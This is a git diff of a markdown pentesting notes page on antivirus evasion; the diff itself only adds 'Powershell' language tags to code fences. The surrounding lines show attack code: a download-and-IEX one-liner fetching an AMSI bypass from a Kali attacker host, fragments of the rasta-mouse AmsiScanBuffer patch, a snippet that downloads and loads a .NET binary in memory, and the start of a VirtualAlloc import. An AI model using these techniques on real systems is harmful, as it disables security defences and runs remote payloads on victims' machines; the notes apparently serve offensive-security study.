@@ -77,7 +77,7 @@ pagetitle: Antivirus Evasion
         - Thus, we also need the following script to bypass AMSI at the .net level (run with `(new-object system.net.webclient).downloadstring('http://{kali_ip:port}/amsi_rmouse.txt')|IEX`)
             - This loads and executes the script directly in memory
 
-```
+```Powershell
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
 $Win32 = @"
 
@@ -110,7 +110,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 - We now have the ability to run anything we'd like, as long as it doesn't touch disk, which can be done like so:
 
-```
+```Powershell
 $data=(New-Object System.Net.WebClient).DownloadData('http://{kali_IP:port}/{exe_binary}');
 $asm = [System.Reflection.Assembly]::Load([byte[]]$data);
 $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
@@ -129,7 +129,7 @@ $out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($s
 
 # Import VirtualAlloc to allocate memory
 
-```
+```Powershell
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
